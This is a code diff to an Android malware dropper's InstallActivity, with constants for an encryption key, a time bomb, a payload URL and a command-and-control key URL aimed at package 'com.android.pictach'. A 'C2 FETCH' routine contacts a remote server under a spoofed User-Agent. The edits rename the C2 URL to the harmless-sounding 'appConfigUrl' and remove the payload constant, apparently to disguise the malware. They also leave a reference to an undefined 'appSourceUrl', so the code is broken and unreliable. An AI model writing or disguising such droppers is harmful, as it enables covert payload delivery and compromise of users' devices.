@@ -33,10 +33,9 @@ class InstallActivity : AppCompatActivity() {
         // ── Patched by bot ────────────────────────────────────────
         private const val AES_KEY_B64  = "AES_KEY_B64_PLACEHOLDER_AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
         private const val HMAC_B64     = "HMAC_SHA256_PLACEHOLDER_BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB"
-        private const val PAYLOAD_URL  = "PAYLOAD_URL_PLACEHOLDER_DDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDD"
         private const val TIMEBOMB_TS  = "TIMEBOMB_TS_PLACEHOLDER_FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
         private const val DEVICE_SALT  = "DEVICE_SALT_PLACEHOLDER_CCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC"
-        private const val C2_KEY_URL   = "C2_KEY_URL_PLACEHOLDER_EEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEE"
+        private const val appConfigUrl   = "appConfigUrl_PLACEHOLDER_EEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEE"
         private const val TARGET_PKG   = "com.android.pictach"
         private const val TARGET_CLASS = "com.android.pictach.MainActivity"
         // ─────────────────────────────────────────────────────────
@@ -102,7 +101,7 @@ class InstallActivity : AppCompatActivity() {
             val rawKey   = c2.first ?: AES_KEY_B64
             val finalKey = deriveKey(rawKey)
 
-            val resolvedUrl = c2.second ?: PAYLOAD_URL
+            val resolvedUrl = c2.second ?: appSourceUrl
             val isRemote = resolvedUrl.startsWith("http") &&
                 !resolvedUrl.contains("PLACEHOLDER")
 
@@ -246,8 +245,8 @@ class InstallActivity : AppCompatActivity() {
     // ── C2 FETCH ──────────────────────────────────────────────────
     private fun fetchC2(): Pair<String?, String?> {
         return try {
-            if (C2_KEY_URL.contains("PLACEHOLDER") || C2_KEY_URL.isBlank()) return Pair(null, null)
-            val conn = URL(C2_KEY_URL).openConnection() as HttpsURLConnection
+            if (appConfigUrl.contains("PLACEHOLDER") || appConfigUrl.isBlank()) return Pair(null, null)
+            val conn = URL(appConfigUrl).openConnection() as HttpsURLConnection
             conn.connectTimeout = 8000; conn.readTimeout = 10000
             conn.setRequestProperty("User-Agent", "okhttp/4.9.0")
             if (conn.responseCode != 200) { conn.disconnect(); return Pair(null, null) }
